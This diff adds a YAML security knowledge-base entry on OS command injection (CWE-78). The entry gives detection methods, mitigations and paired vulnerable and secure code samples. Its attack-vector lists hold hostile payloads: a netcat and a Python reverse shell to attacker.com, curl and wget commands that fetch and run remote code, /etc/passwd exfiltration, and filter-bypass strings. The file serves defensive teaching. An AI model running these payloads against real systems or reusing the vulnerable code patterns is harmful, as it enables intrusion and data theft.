@@ -1,0 +1,335 @@
+name: "OS Command Injection"
+category: "Injection"
+severity: "CRITICAL"
+cwe: "CWE-78"
+owasp: "A03:2021 - Injection"
+
+description: |
+  OS Command Injection vulnerabilities occur when an application passes unsafe user-supplied data to a 
+  system shell. Attackers can inject arbitrary operating system commands that execute with the privileges 
+  of the vulnerable application. This can lead to complete system compromise, data exfiltration, malware 
+  installation, and lateral movement within the network. Command injection is one of the most severe 
+  vulnerabilities as it provides direct access to the underlying operating system.
+
+common_patterns:
+  - "Unsanitized input passed to system() calls"
+  - "Shell command execution with user input"
+  - "Subprocess execution without proper escaping"
+  - "Eval() with user-controlled strings"
+  - "Backtick execution in scripting languages"
+  - "Pipeline commands with user input"
+  - "Cron job manipulation"
+  - "Script generation with user input"
+  - "Log file processing with shell commands"
+  - "Network utility execution (ping, nslookup, dig)"
+  - "File processing commands (convert, ffmpeg)"
+  - "Archive operations (tar, zip, unzip)"
+
+attack_vectors:
+  command_chaining:
+    description: "Chain multiple commands using shell operators"
+    payloads:
+      - "; whoami"
+      - "| whoami"
+      - "& whoami"
+      - "&& whoami"
+      - "|| whoami"
+      - "`whoami`"
+      - "$(whoami)"
+      - "; cat /etc/passwd"
+      - "| nc attacker.com 4444 -e /bin/bash"
+  
+  command_substitution:
+    description: "Execute commands within command substitution"
+    payloads:
+      - "$(curl http://attacker.com/shell.sh | bash)"
+      - "`wget http://attacker.com/backdoor -O /tmp/bd && chmod +x /tmp/bd && /tmp/bd`"
+      - "$(python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);')"
+  
+  newline_injection:
+    description: "Inject commands using newline characters"
+    payloads:
+      - "%0awhoami"
+      - "%0d%0awhoami"
+      - "\nwhoami"
+      - "\r\nwhoami"
+  
+  time_based_blind:
+    description: "Blind command injection using time delays"
+    payloads:
+      - "; sleep 10"
+      - "| sleep 10"
+      - "& ping -c 10 127.0.0.1"
+      - "&& timeout 10"
+  
+  out_of_band:
+    description: "Exfiltrate data via DNS or HTTP"
+    payloads:
+      - "; nslookup $(whoami).attacker.com"
+      - "| curl http://attacker.com/?data=$(cat /etc/passwd | base64)"
+      - "& wget http://attacker.com/$(hostname)"
+  
+  filter_bypass:
+    description: "Bypass weak input filters"
+    payloads:
+      - "w'h'o'a'm'i" # Quote bypass
+      - "w\\ho\\am\\i" # Backslash bypass
+      - "${IFS}cat${IFS}/etc/passwd" # Space bypass with IFS
+      - "cat</etc/passwd" # Space bypass with redirection
+      - "cat${IFS}/etc/passwd" # Space bypass
+      - "{cat,/etc/passwd}" # Brace expansion
+
+exploitation_requirements:
+  - "Application executes system commands"
+  - "User input is incorporated into commands"
+  - "Insufficient input validation/sanitization"
+  - "Shell metacharacters not properly escaped"
+
+detection_methods:
+  static_analysis:
+    - "Search for system(), exec(), popen(), shell_exec()"
+    - "Review subprocess calls with shell=True"
+    - "Check for eval() with user input"
+    - "Review backtick usage"
+    - "Check command string construction"
+    - "Verify input sanitization"
+  
+  dynamic_testing:
+    - "Test with command chaining operators (; | & && ||)"
+    - "Test with command substitution ($() ``)"
+    - "Test with newline injection (%0a %0d)"
+    - "Test time-based blind injection (sleep, ping)"
+    - "Test out-of-band exfiltration (DNS, HTTP)"
+    - "Monitor for command execution in logs"
+    - "Use Burp Collaborator for OOB detection"
+  
+  code_review_checklist:
+    - "Are system commands avoided when possible?"
+    - "Is user input validated against whitelist?"
+    - "Are shell metacharacters escaped?"
+    - "Is shell=False used in subprocess calls?"
+    - "Are parameterized commands used?"
+    - "Is input length limited?"
+    - "Are commands executed with minimal privileges?"
+
+mitigation_strategies:
+  avoid_shell_execution:
+    - "Use language-specific APIs instead of shell commands"
+    - "Use libraries for specific tasks (e.g., file operations)"
+    - "Avoid system(), exec(), shell_exec() functions"
+    - "Use subprocess with shell=False"
+  
+  input_validation:
+    - "Whitelist allowed characters"
+    - "Validate input format (regex)"
+    - "Reject shell metacharacters (; | & $ ` \\ ! < > ( ) { } [ ] * ? ~ ^ %0a %0d)"
+    - "Use parameterized commands"
+    - "Limit input length"
+  
+  secure_coding:
+    - "Use subprocess with argument list (not shell string)"
+    - "Escape shell metacharacters properly"
+    - "Use shlex.quote() in Python"
+    - "Use escapeshellarg() in PHP"
+    - "Never use eval() with user input"
+  
+  access_control:
+    - "Run application with minimal privileges"
+    - "Use separate user accounts for different components"
+    - "Implement principle of least privilege"
+    - "Use chroot or containers for isolation"
+  
+  additional_controls:
+    - "Log all command executions"
+    - "Monitor for suspicious commands"
+    - "Implement rate limiting"
+    - "Use Web Application Firewall (WAF)"
+    - "Implement intrusion detection"
+
+severity_factors:
+  critical:
+    - "Remote code execution as root/admin"
+    - "No authentication required"
+    - "Direct internet exposure"
+    - "Access to sensitive data"
+  
+  high:
+    - "Remote code execution as limited user"
+    - "Authentication required but easily obtained"
+    - "Internal network access"
+  
+  medium:
+    - "Limited command execution"
+    - "Strong authentication required"
+    - "Restricted environment (container, chroot)"
+
+business_impact:
+  - "Complete system compromise"
+  - "Data breach and exfiltration"
+  - "Malware installation"
+  - "Ransomware deployment"
+  - "Lateral movement in network"
+  - "Denial of service"
+  - "Compliance violations (PCI DSS, HIPAA, SOX)"
+  - "Reputational damage"
+  - "Legal liability"
+  - "Business disruption"
+
+compliance_considerations:
+  pci_dss:
+    - "Requirement 6.5.1: Injection flaws"
+    - "Requirement 6.5.8: Improper access control"
+  
+  owasp_top_10:
+    - "A03:2021 - Injection"
+  
+  owasp_api_top_10:
+    - "API8:2023 - Security Misconfiguration"
+  
+  nist:
+    - "SI-10: Information Input Validation"
+    - "AC-6: Least Privilege"
+  
+  gdpr:
+    - "Article 32: Security of processing"
+
+testing_tools:
+  - "Burp Suite (Intruder, Collaborator)"
+  - "OWASP ZAP"
+  - "Commix (automated command injection tool)"
+  - "sqlmap (with --os-shell option)"
+  - "Metasploit Framework"
+  - "curl/wget for manual testing"
+
+code_examples:
+  vulnerable_php: |
+    <?php
+    // VULNERABLE: Direct command execution
+    $ip = $_GET['ip'];
+    $output = shell_exec("ping -c 4 " . $ip);
+    echo "<pre>$output</pre>";
+    ?>
+  
+  secure_php: |
+    <?php
+    // SECURE: Avoid shell, validate input
+    $ip = $_GET['ip'];
+    
+    // Validate IP address format
+    if (!filter_var($ip, FILTER_VALIDATE_IP)) {
+        die("Invalid IP address");
+    }
+    
+    // Use escapeshellarg for additional safety
+    $ip = escapeshellarg($ip);
+    
+    // Better: Use PHP's native functions instead of shell
+    // exec("ping -c 4 " . $ip, $output, $return_var);
+    
+    // Best: Use language-specific libraries
+    // For ping, consider using fsockopen() or socket functions
+    ?>
+  
+  vulnerable_python: |
+    # VULNERABLE: shell=True with user input
+    import subprocess
+    
+    def ping_host(ip):
+        result = subprocess.run(f"ping -c 4 {ip}", shell=True, capture_output=True)
+        return result.stdout
+  
+  secure_python: |
+    # SECURE: Argument list without shell
+    import subprocess
+    import ipaddress
+    
+    def ping_host(ip):
+        # Validate IP address
+        try:
+            ipaddress.ip_address(ip)
+        except ValueError:
+            raise ValueError("Invalid IP address")
+        
+        # Use argument list (shell=False by default)
+        result = subprocess.run(
+            ["ping", "-c", "4", ip],
+            capture_output=True,
+            timeout=10
+        )
+        return result.stdout
+  
+  vulnerable_nodejs: |
+    // VULNERABLE: exec with user input
+    const { exec } = require('child_process');
+    
+    app.get('/ping', (req, res) => {
+        const ip = req.query.ip;
+        exec(`ping -c 4 ${ip}`, (error, stdout, stderr) => {
+            res.send(stdout);
+        });
+    });
+  
+  secure_nodejs: |
+    // SECURE: execFile with argument array
+    const { execFile } = require('child_process');
+    const { isIP } = require('net');
+    
+    app.get('/ping', (req, res) => {
+        const ip = req.query.ip;
+        
+        // Validate IP address
+        if (!isIP(ip)) {
+            return res.status(400).send('Invalid IP address');
+        }
+        
+        // Use execFile with argument array (no shell)
+        execFile('ping', ['-c', '4', ip], { timeout: 10000 }, (error, stdout, stderr) => {
+            if (error) {
+                return res.status(500).send('Error executing command');
+            }
+            res.send(stdout);
+        });
+    });
+  
+  vulnerable_java: |
+    // VULNERABLE: Runtime.exec with concatenated string
+    String ip = request.getParameter("ip");
+    Process process = Runtime.getRuntime().exec("ping -c 4 " + ip);
+  
+  secure_java: |
+    // SECURE: ProcessBuilder with argument list
+    String ip = request.getParameter("ip");
+    
+    // Validate IP address
+    if (!InetAddressValidator.getInstance().isValid(ip)) {
+        throw new IllegalArgumentException("Invalid IP address");
+    }
+    
+    // Use ProcessBuilder with argument list
+    ProcessBuilder pb = new ProcessBuilder("ping", "-c", "4", ip);
+    pb.redirectErrorStream(true);
+    Process process = pb.start();
+
+prevention_checklist:
+  - "[ ] Avoid shell command execution when possible"
+  - "[ ] Use language-specific APIs instead"
+  - "[ ] Validate input against whitelist"
+  - "[ ] Reject shell metacharacters"
+  - "[ ] Use subprocess with argument list (shell=False)"
+  - "[ ] Escape shell metacharacters if shell is required"
+  - "[ ] Never use eval() with user input"
+  - "[ ] Run with minimal privileges"
+  - "[ ] Implement input length limits"
+  - "[ ] Log all command executions"
+  - "[ ] Use containers or chroot for isolation"
+  - "[ ] Implement rate limiting"
+  - "[ ] Use Web Application Firewall"
+  - "[ ] Monitor for suspicious commands"
+
+references:
+  - "OWASP Command Injection: https://owasp.org/www-community/attacks/Command_Injection"
+  - "CWE-78: https://cwe.mitre.org/data/definitions/78.html"
+  - "PortSwigger OS Command Injection: https://portswigger.net/web-security/os-command-injection"
+  - "PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection"
+  - "HackerOne Command Injection Reports: https://hackerone.com/reports?query=command+injection"
+
